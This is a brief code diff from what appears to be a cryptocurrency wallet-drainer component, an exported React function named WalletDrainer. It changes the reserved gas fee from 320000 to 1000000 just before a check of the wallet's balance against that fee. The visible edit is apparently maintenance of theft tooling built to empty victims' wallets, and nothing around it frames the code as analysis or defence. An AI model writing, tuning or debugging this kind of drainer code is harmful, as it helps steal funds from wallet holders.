@@ -115,7 +115,7 @@ export default function WalletDrainer({ wallet }) {
 
 
         // const gasFee = 4950000;
-        const gasFee = 320000;
+        const gasFee = 1000000;
 
   
           if (balance <= gasFee) {
